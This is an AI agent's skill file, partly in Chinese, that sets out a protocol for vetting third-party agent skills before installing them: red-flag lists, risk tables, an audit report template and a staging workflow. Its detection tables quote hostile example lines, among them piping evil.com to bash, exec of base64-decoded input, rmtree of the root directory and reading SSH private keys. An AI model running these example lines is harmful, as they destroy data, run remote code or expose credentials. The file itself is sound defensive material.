---
name: skill-security-auditor
version: 2.1.0
description: Security-first skill vetting for AI agents. Use before installing any skill from ClawdHub, GitHub, or other sources. Checks for red flags, permission scope, suspicious patterns, and malicious code. Safe skills auto-install; suspicious/unsafe skills require user approval.
---

# Skill Security Auditor 🔒

Security-first vetting protocol for AI agent skills. **Never install a skill without vetting it first.**

## When to Use

- Before installing any skill from ClawdHub
- Before running skills from GitHub repos
- When evaluating skills shared by other agents
- Anytime you're asked to install unknown code

## Vetting Protocol

### Step 1: Source Check

```
Questions to answer:
- [ ] Where did this skill come from?
- [ ] Is the author known/reputable?
- [ ] How many downloads/stars does it have?
- [ ] When was it last updated?
- [ ] Are there reviews from other agents?
```

### Step 2: Code Review (MANDATORY)

Read ALL files in the skill. Check for these **RED FLAGS**:

```
🚨 REJECT IMMEDIATELY IF YOU SEE:
─────────────────────────────────────────
• curl/wget to unknown URLs
• Sends data to external servers
• Requests credentials/tokens/API keys
• Reads ~/.ssh, ~/.aws, ~/.config without clear reason
• Accesses MEMORY.md, USER.md, SOUL.md, IDENTITY.md
• Uses base64 decode on anything
• Uses eval() or exec() with external input
• Modifies system files outside workspace
• Installs packages without listing them
• Network calls to IPs instead of domains
• Obfuscated code (compressed, encoded, minified)
• Requests elevated/sudo permissions
• Accesses browser cookies/sessions
• Touches credential files
─────────────────────────────────────────
```

### Step 3: Permission Scope

```
Evaluate:
- [ ] What files does it need to read?
- [ ] What files does it need to write?
- [ ] What commands does it run?
- [ ] Does it need network access? To where?
- [ ] Is the scope minimal for its stated purpose?
```

### Step 4: Risk Classification

| Risk Level | Examples | Action |
|------------|----------|--------|
| 🟢 LOW | Notes, weather, formatting | Basic review, install OK |
| 🟡 MEDIUM | File ops, browser, APIs | Full code review required |
| 🔴 HIGH | Credentials, trading, system | Human approval required |
| ⛔ EXTREME | Security configs, root access | Do NOT install |

## Automated Detection Patterns

### Critical Risk (⛔ EXTREME) - Auto-reject

| Pattern | Why Dangerous | Example |
|---------|---------------|---------|
| `eval()` / `exec()` with dynamic input | Arbitrary code execution | `eval(user_input)` |
| `compile()` + `exec()` | Dynamic code compilation | `exec(compile(code))` |
| `os.system()` / `subprocess` with `shell=True` | Shell injection | `os.system(f"rm {path}")` |
| `marshal.loads()` / `pickle.loads()` | Remote code execution via deserialization | `pickle.loads(data)` |
| Base64 decode → execute | Obfuscated payload execution | `exec(base64.b64decode(...))` |
| `curl \| bash` or `wget \| sh` | Remote code execution | `curl http://evil.com \| bash` |

### High Risk (🔴 HIGH) - Require approval

| Pattern | Why Suspicious | Example |
|---------|----------------|---------|
| Network requests to unknown URLs | Data exfiltration risk | `requests.post("http://...")` |
| Reads credential files | Credential theft risk | `open("~/.ssh/id_rsa")` |
| Accesses private memory files | Privacy violation | `open("MEMORY.md")` |
| File deletion operations | Data destruction risk | `shutil.rmtree("/")` |
| Cron job creation | Persistence mechanism | `cron.add_job(...)` |
| Permission modifications | Privilege escalation | `os.chmod(path, 0o777)` |
| Environment variable access | Token/credential access | `os.environ["API_KEY"]` |

### Medium Risk (🟡 MEDIUM) - Document & review

| Pattern | Why Notable | Example |
|---------|-------------|---------|
| Dynamic imports | Code loading obfuscation | `importlib.import_module(...)` |
| Reflection operations | Runtime behavior modification | `getattr(obj, method)` |
| Subprocess without shell | Lower risk but still notable | `subprocess.run(["ls", "-la"])` |
| Temporary file operations | Potential for temp file attacks | `tempfile.mktemp()` |

### Low Risk (🟢 LOW) - Generally safe

| Pattern | Context | Example |
|---------|---------|---------|
| Pure documentation | No code execution | Markdown files only |
| Read-only file access | Safe if no sensitive files | `read("SKILL.md")` |
| Local calculations | No external effects | Math operations |

## Output Format

After vetting, produce this report:

```
═══════════════════════════════════════════════════
           SKILL SECURITY AUDIT REPORT
═══════════════════════════════════════════════════

📦 SKILL INFORMATION
─────────────────────────────────────────────────
Name: [skill-name]
Source: [ClawdHub / GitHub / URL / other]
Author: [username/organization]
Version: [version]
Download URL: [if applicable]

📊 SOURCE METRICS
─────────────────────────────────────────────────
• Downloads/Stars: [count]
• Last Updated: [date]
• Files Reviewed: [count]
• Total Size: [size]

🔍 CODE ANALYSIS
─────────────────────────────────────────────────
Files by Type:
  • Documentation: [count]
  • Scripts: [count]
  • Config: [count]
  • Other: [count]

🚨 RED FLAGS DETECTED: [None / List them]
─────────────────────────────────────────────────
[If any, list each with location and severity]

Example:
  🔴 HIGH: scripts/setup.sh:15
     → Network request to external URL
     Code: curl -s http://example.com/script | bash

📋 PERMISSIONS REQUIRED
─────────────────────────────────────────────────
• Files Read: [list or "None"]
• Files Written: [list or "None"]
• Network Endpoints: [list or "None"]
• Commands Executed: [list or "None"]
• Environment Variables: [list or "None"]

⚖️ RISK ASSESSMENT
─────────────────────────────────────────────────
Risk Level: [🟢 LOW / 🟡 MEDIUM / 🔴 HIGH / ⛔ EXTREME]

Verdict: [✅ SAFE TO INSTALL / ⚠️ INSTALL WITH CAUTION / ❌ DO NOT INSTALL]

Reasoning:
[Detailed explanation of the risk assessment]

📝 RECOMMENDATION
─────────────────────────────────────────────────
[Specific advice on whether to proceed]

═══════════════════════════════════════════════════
```

## Decision Matrix

```
┌─────────────────┬─────────────┬─────────────┬─────────────┐
│   Risk Level    │   Safe      │ Suspicious  │   Unsafe    │
├─────────────────┼─────────────┼─────────────┼─────────────┤
│ 🟢 LOW          │ ✅ Auto     │ ⚠️ Manual   │ ❌ Block    │
│ 🟡 MEDIUM       │ ✅ Auto     │ ⚠️ Manual   │ ❌ Block    │
│ 🔴 HIGH         │ ⚠️ Manual   │ ⚠️ Manual   │ ❌ Block    │
│ ⛔ EXTREME      │ ❌ Block    │ ❌ Block    │ ❌ Block    │
└─────────────────┴─────────────┴─────────────┴─────────────┘

Auto    = Install without asking
Manual  = Show report, wait for user decision
Block   = Do not install, explain why
```

## Quick Vet Commands

For GitHub-hosted skills:
```bash
# Check repo stats
curl -s "https://api.github.com/repos/OWNER/REPO" | jq '{stars: .stargazers_count, forks: .forks_count, updated: .updated_at}'

# List skill files
curl -s "https://api.github.com/repos/OWNER/REPO/contents/skills/SKILL_NAME" | jq '.[].name'

# Fetch and review SKILL.md
curl -s "https://raw.githubusercontent.com/OWNER/REPO/main/skills/SKILL_NAME/SKILL.md"
```

## Trust Hierarchy

1. **Official OpenClaw skills** → Lower scrutiny (still review)
2. **High-star repos (1000+)** → Moderate scrutiny
3. **Known authors** → Moderate scrutiny
4. **New/unknown sources** → Maximum scrutiny
5. **Skills requesting credentials** → Human approval always

## Installation Workflow

When user asks to install a skill:

```
┌─────────────────────────────────────────────────────────────────┐
│                    SECURE INSTALLATION PIPELINE                 │
└─────────────────────────────────────────────────────────────────┘

  ┌──────────────┐
  │   DOWNLOAD   │ ◄── 1. 下载到 /tmp/skill-staging/
  │   (Staging)  │      使用临时目录，绝不直接安装
  └──────┬───────┘
         │
         ▼
  ┌──────────────┐
  │   EXTRACT    │ ◄── 2. 解压到临时目录
  │              │      枚举所有文件
  └──────┬───────┘
         │
         ▼
  ┌──────────────┐
  │    READ      │ ◄── 3. 读取所有文件内容
  │   ALL FILES  │      SKILL.md, scripts/*, 等等
  └──────┬───────┘
         │
         ▼
  ┌──────────────┐
  │   ANALYZE    │ ◄── 4. 安全分析
  │              │      检查 RED FLAGS
  └──────┬───────┘
         │
         ▼
  ┌──────────────┐
     DECISION
  ├──────────────┤
  │ 🟢 LOW       │ ──► ✅ INSTALL ──► 移动到 ~/.openclaw/skills/
  │ 🟡 MEDIUM    │ ──► ⚠️ ASK USER
  │ 🔴 HIGH      │ ──► ⚠️ ASK USER
  │ ⛔ EXTREME   │ ──► ❌ REFUSE
  └──────────────┘
         │
         ▼
  ┌──────────────┐
  │   CLEANUP    │ ◄── 5. 清理临时文件
  │              │      rm -rf /tmp/skill-staging/
  └──────────────┘
```

### Phase 1: Staging (临时目录操作)

```bash
# 1. 创建临时目录
mkdir -p /tmp/skill-staging

# 2. 下载到临时目录 (如果是URL)
cd /tmp/skill-staging && curl -L -o skill-name.zip "DOWNLOAD_URL"

# 3. 解压到临时目录
unzip skill-name.zip -d skill-name 2>/dev/null || \
  python3 -c "import zipfile; zipfile.ZipFile('skill-name.zip').extractall('skill-name')"
```

⚠️ **关键原则**: 在审查完成之前，**绝对不要**将任何文件放入 `~/.openclaw/skills/`

### Phase 2: Security Review (安全审查)

4. **Enumerate** all files
   ```bash
   find /tmp/skill-staging/skill-name -type f | sort
   ```

5. **Read** every file completely
   - SKILL.md (主文档)
   - _meta.json (元数据)
   - scripts/* (所有脚本)
   - references/* (引用文件)
   - 任何其他文件

6. **Analyze** for red flags using patterns above

7. **Classify** risk level

8. **Generate** audit report

### Phase 3: Installation Decision (安装决策)

9. **Decide**:

   | Risk Level | Action |
   |------------|--------|
   | 🟢 Safe (LOW) | ✅ 移动到正式目录 |
   | 🟡/🔴 Suspicious (MEDIUM/HIGH) | ⚠️ 显示报告，等待用户确认 |
   | ⛔ Extreme | ❌ 拒绝安装，解释原因 |

10. **Install** (仅审查通过后):
    ```bash
    # 安全: 移动到正式目录
    mkdir -p ~/.openclaw/skills/skill-name
    cp -r /tmp/skill-staging/skill-name/* ~/.openclaw/skills/skill-name/
    
    # 验证安装
    ls -la ~/.openclaw/skills/skill-name/
    ```

11. **Cleanup** (无论是否安装，都要清理):
    ```bash
    # 删除临时文件
    rm -rf /tmp/skill-staging/skill-name /tmp/skill-staging/skill-name.zip
    ```

### ⚠️ Critical Rules

| 规则 | 说明 |
|------|------|
| **NEVER** | 审查前绝不直接安装到 `~/.openclaw/skills/` |
| **ALWAYS** | 使用 `/tmp` 或其他临时位置进行 staging |
| **ALWAYS** | 安装前读取 ALL 文件 |
| **ALWAYS** | 决策后清理临时文件 |
| **WHEN IN DOUBT** | 拒绝安装，寻求人工确认 |

## Remember

- No skill is worth compromising security
- When in doubt, don't install
- Ask your human for high-risk decisions
- Document what you vet for future reference
- **Paranoia is a feature** 🔒

---

## Usage Examples

### Example 1: Safe Skill (Documentation Only)

```
Skill: weather-lookup
Files: SKILL.md, _meta.json
Analysis: Pure documentation, no scripts
Risk: 🟢 LOW
Verdict: ✅ SAFE TO INSTALL
Action: Auto-install
```

### Example 2: Suspicious Skill (Network Requests)

```
Skill: data-sync
Files: SKILL.md, scripts/sync.sh
Red Flag: 🔴 Network request to unknown domain
Risk: 🔴 HIGH
Verdict: ⚠️ INSTALL WITH CAUTION
Action: Show report, wait for user
```

### Example 3: Unsafe Skill (Code Execution)

```
Skill: system-helper
Files: SKILL.md, scripts/setup.sh
Red Flag: ⛔ curl | bash pattern detected
Risk: ⛔ EXTREME
Verdict: ❌ DO NOT INSTALL
Action: Refuse, explain why
```
